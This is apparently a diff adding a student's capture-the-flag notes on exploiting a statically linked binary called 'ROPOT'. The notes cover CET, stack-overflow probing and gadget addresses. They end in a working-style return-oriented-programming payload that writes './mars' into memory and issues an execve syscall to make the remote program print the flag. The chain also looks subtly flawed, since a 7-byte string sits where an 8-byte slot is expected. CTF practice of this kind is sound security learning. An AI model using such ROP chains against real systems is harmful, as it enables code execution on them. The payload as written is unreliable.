@@ -1,0 +1,111 @@
+
+There is no canary
+
+"endbr64" in all functions:
+	-> are a part of Intel's Control-Flow Enforcement Technology (CET)
+	-> Intel CET offers hardware protection against Return-oriented Programming (ROP) and Jump/Call-oriented Programming (JOP/COP) attacks, which manipulate control flow in order to re-use existing code for malicious purposes.
+
+  -> attack: function must start with endbr64
+
+
+ROPOT:
+ Main: we dont keep any input we just invoke functions	
+ 	SubRoutine_init: we read input and we can see it is susceptible to overflows
+ 	Event_loop:
+ 		subroutine_decide_on_action
+ 		subroutine_search_crashsite:
+ 			have_debris
+ 		subroutine_assemble_beacon
+ 		subroutine_go_north
+ 		subroutine_go_south
+ 		subroutine_study_flora
+ 		subroutine_indecision
+ 		subroutine_standby
+
+MARS: "By executing it, the program will print the content of the flag file"
+ Main:
+ 	->open64: opens a file and returns the file descriptor (WHAT FILE DOES IT OPEN???). This file descriptor is kept in: -0x4(%rbp); The file read is in 
+ 	-> the file descriptor obtained, the file is read and verifies if it is 0
+ 	-> when the value of the file descriptor is 0, the content of the file is writen in the stdout
+
+
+
+-> We cannot overflow the function mars, as we dont write any input on it
+-> I run the value 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 and it result it on a segmentation fault, which tell me the program is susceptable to overflows 
+-> 40 results on a overflow
+-> 30 results on a overflow
+-> 20 doesnt result on a overflow
+-> 25 results on a overflow
+-> 23 is the maximum size for the first input
+
+->The document are statically linked
+
+-> By using gdb in the function subroutine_init, we can see that the space between rax and saved ebp is 0x10.
+-> is the output of the function scanf is used 0x0000000000401df0 and its output is saved in rax
+-> WHY IS GETCHAR USED????
+
+-> As the function mars is not used, we need to use a system call to envoked it.
+
+
+-> Trying to overflow the second input using large numbers and a string the output was: "Maybe repurposing this program of us lets us access the long-range comms?"
+
+-> Which made me think I might need to overflow the first input
+
+-> I think our goal is to somehow managed to change the course of the program ./ropot running on the remote host to execute the "execve("./mars")" so that the program mars will read the actual flag on the remote host
+	First Question:
+		-> Where to explore
+	Second Question:
+		-> What script to run (Some close to "execve("./mars")")
+		-> What is the address for execve
+		-> What is the address for ./mars
+		-> I think I need to do pop_rdi (because that's the input of the syscall)
+
+	First the RopPart of the Script:
+		-> popRDI = p64(0x4018ea) : pop rdi ; ret
+		-> p64(0x40f6be) : pop rsi ; ret
+		-> p64(0x4017ef) : pop rdx ; ret
+		-> 0x000000000040225b : pop rbx ; ret
+		-> 0x0000000000459e97 : pop rax ; ret
+
+		-> 0x0000000000428838 : mov qword ptr [rdx], rax ; ret
+
+		-> 0x00000000004012e3 : syscall
+
+		-> 3. execve = 3b
+
+
+padding = b'A'*24
+
+popRdi = p64(0x4018ea)
+popRsi = p64(0x40f6be)
+popRdx = p64(0x4017ef)
+popRbx = p64(0x40225b)
+popRax = p64(0x459e97)
+
+writeGadget = p64(0x428838)
+
+syscallGadget = p64(0x4012e3)
+
+payload = padding
+
+
+payload += popRax
+payload += b"./mars\x00"
+payload += popRdx
+payload += p64(0x4e1bc0) #endereço memoria writeble
+payload += writeGadget
+
+payload += popRax
+payload += p64(0x3b)
+payload += popRdi
+payload += p64(0x4e1bc0) #endereço memoria writeble
+
+payload += popRsi
+payload += p64(0)
+payload += popRdx
+payload += p64(0)
+
+payload += syscallGadget
+
+
+-> Maximum size of payload:  1024
